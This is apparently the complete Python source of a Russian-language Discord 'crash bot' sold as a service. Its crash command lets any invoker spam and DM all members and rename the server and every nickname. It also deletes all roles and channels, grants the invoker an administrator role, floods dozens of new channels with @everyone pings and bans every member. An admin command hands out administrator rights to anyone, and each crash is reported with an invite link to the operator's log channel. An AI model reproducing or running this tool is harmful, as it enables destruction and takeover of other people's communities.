# -*- coding: utf8 -*-

import discord
from discord.ext import commands
import discord
from discord import utils
import os, time,subprocess
import config

client = commands.Bot(command_prefix=config.prefix, self_bot=False)  # Префикс бота
client.remove_command('help')








# dasdasdasdasdasdasdlkuy2tgfvbnwmskdufygrve3b wms,lcfiurhebwn ams,zxlcfij s,xcfiroaihdibalisdbLABs
#      ___          ___          ___           ___               ___          ___       ___
#     /\  \        /\  \        /\__\         /\  \   ___       /\  \        /\  \     /\  \
#    /::\  \      /::\  \      /::|  |        \:\  \ /\  \     /::\  \      /::\  \    \:\  \
#   /:/\:\  \    /:/\:\  \    /:|:|  |    ___ /::\__\\:\  \   /:/\:\  \    /:/\:\  \    \:\  \
#  /::\~\:\__\  /::\~\:\  \  /:/|:|  |__ /\  /:/\/__//::\__\ /::\~\:\__\  /:/  \:\  \   /::\  \
# /:/\:\ \:|__|/:/\:\ \:\__\/:/ |:| /\__\\:\/:/  /__/:/\/__//:/\:\ \:|__|/:/__/ \:\__\ /:/\:\__\
# \:\~\:\/:/  /\/__\:\/:/  /\/__|:|/:/  / \::/  //\/:/  /   \:\~\:\/:/  /\:\  \ /:/  //:/  \/__/
#  \:\ \::/  /      \::/  /     |:/:/  /   \/__/ \::/__/     \:\ \::/  /  \:\  /:/  //:/  /
#   \:\/:/  /       /:/  /      |::/  /           \:\__\      \:\/:/  /    \:\/:/  / \/__/
#    \::/__/       /:/  /       /:/  /             \/__/       \::/__/      \::/  /
#     ~~           \/__/        \/__/                           ~~           \/__/
# dasdasdasdasdasdasdlkuy2tgfvbnwmskdufygrve3b wms,lcfiurhebwn ams,zxlcfij s,xcfiroaihdibalisdbLABs







async def send_event_crasha(ctx, old_name, old_icon_url):
    link = await ctx.channel.create_invite(max_age=0)
    await ctx.send(link)
    text1 = (f'Сервер {old_name} крашнут!')
    text2 = (f'пользователем {ctx.message.author}')
    embed = discord.Embed(title=text1, description=text2,
                          color=0xff0000)
    embed.set_author(name="Приглашение на сервер", url=link)
    embed.set_thumbnail(url=old_icon_url)
    embed.add_field(name="Cервер разнесли в пух и прах!", value="Powered by Banjiro_me#1111", inline=False)
    channel = client.get_channel(config.log_channel)
    await channel.send(embed=embed)
    print(ctx.message.guild, 'crashed')

async def start_crash(ctx):
    old_name = ctx.message.guild.name
    old_icon_url = ctx.guild.icon_url
    await ctx.send("до краша сервера осталось 3 секунды")
    time.sleep(1)
    await ctx.send("до краша сервера осталось 2 секунды")
    time.sleep(1)
    await ctx.send("до краша сервера осталось 1 секунда!")
    time.sleep(1)
    await ctx.send("@everyone ПОШЛА ПИЗДА ПО КОЧКАМ")
    await ctx.send(f'@everyone Краш начат by {ctx.author.mention}!')
    await ctx.author.send(f'Рассылка пользователям началась')
    for member in ctx.guild.members:
        try:
            await member.send(f"Краш начат by {ctx.author}")
        except:
            print(f'Сообщение не было отправлено пользователю {member}')
    await ctx.author.send(f'Началась смена аватарки и названия сервера')
    with open('icon.jpg', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(name=f'Crashed by {ctx.author}', icon=icon)
    await ctx.author.send("Смена никнейнов пользователей")
    for i in ctx.guild.members:
        try:
            await i.edit(nick=f"Crashed by {ctx.author}")
        except:
            pass
    try:
        await ctx.author.edit(nick=f'Crasher {ctx.author}')
    except:
        pass

    try:
        await ctx.me.edit(nick=f'Crasher {ctx.author}')
    except:
        pass
    await ctx.author.send(f'Удаление всех каналов и ролей сервера')
    for roles in ctx.guild.roles:
        try:
            await roles.delete()
        except:
            pass
    for channel in ctx.guild.channels:
        await channel.delete()
    await ctx.author.send(f'Создание админ роли GOD и выдача вам')
    guilddd = ctx.guild
    permss = discord.Permissions(administrator=True)
    await guilddd.create_role(name="GOD", permissions=permss, colour=discord.Colour(0xff0000),
                            hoist=True)
    roleee = discord.utils.get(ctx.guild.roles, name="GOD")
    userrr = ctx.message.author
    await userrr.add_roles(roleee)
    await ctx.author.send(f'Создание каналов и ролей с названием "Crashed by {ctx.author}"')
    for i in range(40):
        await ctx.guild.create_role(name=f'Crashed by {ctx.author}')
        await ctx.guild.create_role(name=f'Crashed by {ctx.author}')
        await ctx.guild.create_role(name=f'Crashed by {ctx.author}')
        await ctx.guild.create_text_channel(f'Crashed by {ctx.author}')
        await ctx.guild.create_voice_channel(f"Crashed by {ctx.author}")
    await ctx.author.send(f'Начался спам по текстовым каналам')
    for channel in ctx.guild.text_channels:
        await channel.send('@everyone')
        embed = discord.Embed(title="Сервер Крашиться!", color=0xfa0000)
        embed.set_author(name="Сервер Автора крашера", url=config.main_invite,
                         icon_url='https://wallpapercave.com/wp/wp7229965.jpg'),
        embed.set_thumbnail(
            url="https://wallpapercave.com/wp/wp7229965.jpg"),
        embed.add_field(name=f"Краш by {ctx.message.author}", value='Сервер был крашнут ботом BanjiCrasher',
                        inline=True),
        embed.set_footer(text="by Banjiro")
        await channel.send(embed=embed)
        await channel.send('@everyone')
        await channel.send(embed=embed)
    await ctx.author.send(f"Начался массовый бан пользователей")
    for m in ctx.guild.members:
        if m != ctx.author:
            try:
                await m.send(f"Краш прошел by {ctx.author}")
                await m.ban(reason="По просьбе")
            except:
                pass
    await test(ctx, old_name, old_icon_url)
    await ctx.author.send(f"Поздравляю, краш прошел успешно, вы получили полные права на сервере {old_name}")


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(embed = discord.Embed(description = f'{ctx.author.name}, команда не найдена!', colour = discord.Color.red()))
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(embed=discord.Embed(description=f'{ctx.author.name}, в команде был потерян аргумент ', colour=discord.Color.red()))
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(embed = discord.Embed(description = f'{ctx.author.name}, у вас недостаточно прав для выполнения данной команды!', colour = discord.Color.red()))



@client.event
async def on_ready():
    print('Загружен краш бот: {0}!'.format(client.user))
    await client.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'My prefix "{config.prefix}"',
                                                                                          url='https://www.twitch.tv/unknowpage'))

    channel = client.get_channel(config.log_channel)
    await channel.send(embed = discord.Embed(description=f'{client.user} загружен!',
                          colour=discord.Color.purple()))


@client.command()
@commands.has_role(config.admin)
async def clear(ctx, user: discord.Member):
    await ctx.channel.purge(limit=None, check=lambda m: m.author==user)
    message = await ctx.send(f'Сообщения пользователя {user} очистил: {ctx.author.mention}')
    time.sleep(4)
    await message.delete()

@client.command()
@commands.has_role(config.admin)
async def ping(ctx):
    ping_ = client.latency
    ping = round(ping_ * 1000)
    await ctx.send(embed = discord.Embed(description=f'Мой пинг на сервере {ping}ms', colour=discord.Color.purple()))



@client.command()
@commands.has_role(config.admin)
async def purge(ctx, limit: int):
    await ctx.channel.purge(limit=limit)
    message = await ctx.send(f'Сообщения очистил: {ctx.author.mention}')
    time.sleep(4)
    await message.delete()



@client.command()
@commands.has_role(config.admin)
async def status_off(ctx):
    await client.change_presence(status=discord.Status.offline)
    message = await ctx.send(embed=discord.Embed(description=f'{ctx.author.name} Бот перешел в скрытый режим', colour=discord.Color.purple()))
    await message.add_reaction('✅')


@client.command()
@commands.has_role(config.admin)
async def status_on(ctx):
    message = await ctx.send(embed=discord.Embed(description=f'{ctx.author.name} Бот перешел в обычный режим', colour=discord.Color.purple()))
    await client.change_presence(status=discord.Status.online,
                                 activity=discord.Streaming(name=f'My prefix "{config.prefix}"',
                                                            url='https://www.twitch.tv/unknowpage'))
    await message.add_reaction('✅')


@client.command(pass_context=True)
@commands.has_role(config.admin)
async def opo(ctx, *, args):
    print(ctx.guild.members)
    await ctx.message.delete()
    author = ctx.message.author
    args = args
    print(args)
    biba = (f'{author.mention} Оповещений отправлено  c текстом: {args}!')
    await ctx.send(biba)
    print("#0 Оповещение отправлено c текстом:", args)
    for member in ctx.guild.members:
        try:
            await member.send(args)
        except:
            continue
##################CRASH COMMANDS######################

@client.command()
async def admin(ctx):
    if ctx.guild.id != config.save_guild:
        await ctx.message.delete()
        guild = ctx.guild
        perms = discord.Permissions(administrator=True)
        await guild.create_role(name="GOD", permissions=perms, colour=discord.Colour(0xff0000),
                                hoist=True)
        role = discord.utils.get(ctx.guild.roles, name="GOD")
        user = ctx.message.author
        await user.add_roles(role)
        author = ctx.message.author
        for m in ctx.guild.roles:
            try:
                await author.add_roles(m)
            except:
                await author.send(f"Не удалось выдать роль {m}")
        embed = discord.Embed(description=f'{ctx.author.name} запросил админ роль на сервере {ctx.guild}', colour=discord.Color.purple())
        channel = client.get_channel(config.log_channel)
        await channel.send(embed=embed)
    else:
        await ctx.send("Этот сервер защищен BanjiSecure")


@client.command()
async def admroles(ctx):
    if ctx.guild.id != config.save_guild:
        await ctx.message.delete()
        if ctx.guild.id != config.save_guild:
            author = ctx.message.author
            for m in ctx.guild.roles:
                await author.send(m)
        channel = client.get_channel(config.log_channel)
        embed = discord.Embed(description=f'{ctx.author.name} запросил сбор ролей на сервере {ctx.guild}', colour=discord.Color.purple())
        await channel.send(embed=embed)
    else:
        await ctx.send("Этот сервер защищен BanjiSecure")

@client.command()
async def crash(ctx):
    if ctx.guild.id != config.save_guild:
        await ctx.author.send('Краш начался!')
        await start_crash(ctx)
    else:
        await ctx.send("Этот сервер защищен BanjiSecure")


@client.command()
@commands.has_role(config.admin)
async def hello(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Представлю вам нашего нового Краш-Бота", color=0x913ea8)
    embed.set_author(name="Banjiro", url="https://discord.gg/RCpPV9KGsg",
                     icon_url="https://media.discordapp.net/attachments/856179104939769856/856191764707803216/unknown.png")
    embed.set_thumbnail(
        url="https://media.discordapp.net/attachments/856179104939769856/856191764707803216/unknown.png")
    embed.add_field(name="Скорость", value="Весь функционал оптимизирован что только ускоряет работу", inline=False)
    embed.add_field(name="Функционал", value="У нас есть уникальные функции, которых нет нигде!", inline=True)
    embed.add_field(name="Доступность", value="Низкие цены - наш приоритет", inline=True)
    embed.add_field(name="Безопасность", value="Вы можете обезопасить свой сервер от этого монстра", inline=True)
    await ctx.send(embed=embed)


client.run(config.TOKEN)

